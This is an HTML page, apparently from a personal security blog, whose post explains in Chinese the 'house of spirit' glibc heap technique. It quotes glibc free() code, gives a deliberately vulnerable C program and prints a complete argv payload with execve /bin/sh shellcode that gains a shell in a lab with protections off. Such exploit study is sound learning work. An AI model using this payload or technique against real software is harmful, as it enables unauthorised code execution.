@@ -1,0 +1,875 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="heap,exploit," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="最近几天有点忙，实在是没多少时间写博客，但是还是抽出点时间来记录一下，养成个好习惯！今天记录的house of spirit跟stack有关，但是核心部分依然是堆的free。但中间遇到个问题，直接执行程序得不到shell，但是我用gdb调试最后却得到了shell……不知道为什么。 利用条件 p = malloc(n),栈溢出能覆盖p。 free(p)时，可以控制这个伪造chunk的size字段，同">
+<meta name="keywords" content="heap,exploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of spirit">
+<meta property="og:url" content="http://yoursite.com/2016/10/18/house-of-spirit/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="最近几天有点忙，实在是没多少时间写博客，但是还是抽出点时间来记录一下，养成个好习惯！今天记录的house of spirit跟stack有关，但是核心部分依然是堆的free。但中间遇到个问题，直接执行程序得不到shell，但是我用gdb调试最后却得到了shell……不知道为什么。 利用条件 p = malloc(n),栈溢出能覆盖p。 free(p)时，可以控制这个伪造chunk的size字段，同">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/spirit_set_args.PNG">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/spirit_find_place.PNG">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/spirit_shell.PNG">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/spirit_error.PNG">
+<meta property="og:updated_time" content="2017-05-10T07:51:23.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house of spirit">
+<meta name="twitter:description" content="最近几天有点忙，实在是没多少时间写博客，但是还是抽出点时间来记录一下，养成个好习惯！今天记录的house of spirit跟stack有关，但是核心部分依然是堆的free。但中间遇到个问题，直接执行程序得不到shell，但是我用gdb调试最后却得到了shell……不知道为什么。 利用条件 p = malloc(n),栈溢出能覆盖p。 free(p)时，可以控制这个伪造chunk的size字段，同">
+<meta name="twitter:image" content="http://of38fq57s.bkt.clouddn.com/spirit_set_args.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/10/18/house-of-spirit/"/>
+
+
+  <title> house of spirit | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                house of spirit
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-10-18T08:16:26+08:00" content="2016-10-18">
+              2016-10-18
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/heap-exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">heap_exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/10/18/house-of-spirit/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/10/18/house-of-spirit/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近几天有点忙，实在是没多少时间写博客，但是还是抽出点时间来记录一下，养成个好习惯！<br>今天记录的house of spirit跟stack有关，但是核心部分依然是堆的free。但中间遇到个问题，直接执行程序得不到shell，但是我用gdb调试最后却得到了shell……不知道为什么。</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>p = malloc(n),栈溢出能覆盖p。</li>
+<li>free(p)时，可以控制这个伪造chunk的size字段，同时可以控制next chunk的size字段。</li>
+<li>q = malloc(n)，n经过request2size(n)转化后等于上一次伪造的size。</li>
+<li>可以控制指针q指向的内存。<a id="more"></a>
+<h2 id="利用详解"><a href="#利用详解" class="headerlink" title="利用详解"></a>利用详解</h2></li>
+</ol>
+<p>house of spirit其实就是通过栈溢出伪造一个chunk，然后free，然后malloc，使得可以对栈上的返回地址进行任意写。<br>首先覆盖p为栈上的地址(需要进过计算)。要注意的是，应该对相邻的下一个chunk的size字段进行适当操作，其大小要合适，且pre_inuse(for fastbin, pre_inuse always equals 1)位置1，因为在释放伪造的chunk时，会进行相关检查。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span></div><div class="line">_int_free(mstate av, Void_t* mem)</div><div class="line">&#123;</div><div class="line">  mchunkptr       p;           <span class="comment">/* chunk corresponding to mem */</span></div><div class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></div><div class="line">  mfastbinptr*    fb;          <span class="comment">/* associated fastbin */</span></div><div class="line"></div><div class="line">  [...]</div><div class="line"></div><div class="line">  p = mem2chunk(mem);</div><div class="line">  size = chunksize(p);</div><div class="line"></div><div class="line">  [...]</div><div class="line"></div><div class="line">  <span class="comment">/*</span></div><div class="line">    If eligible, place chunk on a fastbin so it can be found</div><div class="line">    and used quickly in malloc.</div><div class="line">  */</div><div class="line"></div><div class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)</div><div class="line"></div><div class="line">  #<span class="keyword">if</span> TRIM_FASTBINS</div><div class="line">      <span class="comment">/*</span></div><div class="line">	If TRIM_FASTBINS set, don't place chunks</div><div class="line">	bordering top into fastbins</div><div class="line">      */</div><div class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</div><div class="line">  #endif</div><div class="line">      ) &#123;</div><div class="line"></div><div class="line">    <span class="comment">//to check if the next chunk's size is OK~~~</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</div><div class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">		errstr = <span class="string">"free(): invalid next size (fast)"</span>;</div><div class="line">		<span class="keyword">goto</span> errout;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    [...]</div><div class="line">    fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</div><div class="line">    [...]</div><div class="line">    p-&gt;fd = *fb;</div><div class="line">    *fb = p;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<p>如果要说为什么是跟fastbin有关，我觉得这就不一定了。这要看后面第二次malloc时的大小了。至于如果后面malloc的大小大于fastbin的max了，我就不知道能不能利用成功了。<br>接着free时，glibc会将伪造的chunk link到fastbin中。然后malloc时返回的地址将是栈上的地址，当你可以对malloc返回地址写数据时，可以覆盖return address为shellcode的地址。</p>
+<h2 id="利用举例"><a href="#利用举例" class="headerlink" title="利用举例"></a>利用举例</h2><p>任何利用方式只有举个例子才明白，所以还是来点实际的吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str1, <span class="keyword">int</span> age)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *ptr1, name[<span class="number">44</span>];</div><div class="line">  <span class="keyword">int</span> local_age;</div><div class="line">  <span class="keyword">char</span> *ptr2;</div><div class="line"></div><div class="line">  local_age = age;</div><div class="line"></div><div class="line">  ptr1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">256</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nPTR1 =  %p "</span>, ptr1);</div><div class="line">  <span class="built_in">strcpy</span>(name, str1);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nPTR1 =  %p \n"</span>, ptr1);</div><div class="line"></div><div class="line">  <span class="built_in">free</span>(ptr1);</div><div class="line"></div><div class="line">  ptr2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">40</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nPTR2 =  %p \n"</span>, ptr2);</div><div class="line"></div><div class="line">  <span class="built_in">snprintf</span>(ptr2, <span class="number">40</span><span class="number">-1</span>, <span class="string">"%s is %d years old"</span>, name, local_age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\n%s\n"</span>, ptr2);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> pad[<span class="number">10</span>];</div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i ++)</div><div class="line">  &#123; </div><div class="line">    pad[i] = <span class="number">0x21</span>;   <span class="comment">//to satisfy the next chunk's size</span></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (argc == <span class="number">3</span>)</div><div class="line">  &#123;</div><div class="line">    vuln(argv[<span class="number">1</span>], atoi(argv[<span class="number">2</span>]));</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>默认是关闭DEP，ALSR，和stack protector的。<br>首先用gdb调试确定各个变量的位置:<br><img src="http://of38fq57s.bkt.clouddn.com/spirit_set_args.PNG"><br><img src="http://of38fq57s.bkt.clouddn.com/spirit_find_place.PNG"><br>由图我们可以得到各变量的位置如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">|----------|</div><div class="line">|..........|</div><div class="line">|..name[]..| &lt;---<span class="number">-0xbffff378</span></div><div class="line">|..........|</div><div class="line">|..name[]..|</div><div class="line">|..ptr2....| &lt;---<span class="number">-0xbffff3a4</span></div><div class="line">|..ptr1....| &lt;---<span class="number">-0xbffff3a8</span></div><div class="line">|..localage| &lt;---<span class="number">-0xbffff3ac</span></div><div class="line">|..........| &lt;---<span class="number">-0xbffff3b0</span></div><div class="line">|..........|</div><div class="line">|..........|</div><div class="line">|.main ebp.| </div><div class="line">|.ret addr.|</div><div class="line">|.argv[<span class="number">2</span>]..|</div><div class="line">|.argv[<span class="number">1</span>]..|</div><div class="line">|..........|</div><div class="line">|...pad[]..| &lt;---<span class="number">-0xbffff3de</span></div></pre></td></tr></table></figure></p>
+<p>localage变量是伪造chunk的size字段，大小等于0x30。覆盖p为0xbffff3b0，当free时，glibc会把0xbffff3a8 link到fastbin中，这会检查后一个相邻chunk的size字段，我们已经填充了，即pad[]。然后后面malloc(40)时，会把0xbffff3b0返回给用户。然后我们可以对相应栈区进行写操作，覆盖ret addr为shellcode地址。<br>此时malloc返回地址离ret addr还有12个字节。所以这部分要填充。然后是返回地址0xbfffff378(of course you can jump the right shellcode address), 前面”\xeb\x0e”是jmp到shellcode的位置，即从”\x6a”开始部分。<br>所以argv[1]的内容为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"\xeb\x0e\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x78\xf3\xff\xbf\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"</span>+<span class="string">"a"</span>*<span class="number">8</span>+<span class="string">"\xb0\xf3\xff\xbf\x30"</span></div></pre></td></tr></table></figure></p>
+<p>至于argv[2]取什么值没影响。<br>我们能看到第二次p被覆盖为0xbffff3b0，且第二次malloc时返回的地址为0xbffff3b0。最后我们得到了一个shell！！！</p>
+<p><img src="http://of38fq57s.bkt.clouddn.com/spirit_shell.PNG"></p>
+<p>不知道为什么直接运行程序得不到shell：<br><img src="http://of38fq57s.bkt.clouddn.com/spirit_error.PNG"><br>这真的很奇怪……一步一步调试发现free()可以正常执行啊。Anyway, got a shell at last!</p>
+<h2 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h2><p>相关链接：<br><a href="https://sploitfun.wordpress.com/tag/house-of-force/" target="_blank" rel="external">Heap overflow using Malloc Maleficarum</a><br><a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/" target="_blank" rel="external">X86 EXPLOITATION 101: “HOUSE OF SPIRIT” – FRIENDLY STACK OVERFLOW</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/heap/" rel="tag">#heap</a>
+          
+            <a href="/tags/exploit/" rel="tag">#exploit</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/15/house-of-force/" rel="next" title="house of force">
+                <i class="fa fa-chevron-left"></i> house of force
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/10/19/house-of-lore/" rel="prev" title="house of lore">
+                house of lore <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">33</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://y0ung.tech" title="y0ung" target="_blank">y0ung</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用条件"><span class="nav-number">1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用详解"><span class="nav-number">2.</span> <span class="nav-text">利用详解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用举例"><span class="nav-number">3.</span> <span class="nav-text">利用举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关参考"><span class="nav-number">4.</span> <span class="nav-text">相关参考</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2016/10/18/house-of-spirit/';
+      var disqus_title = "house of spirit";
+      var disqus_url = 'http://yoursite.com/2016/10/18/house-of-spirit/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
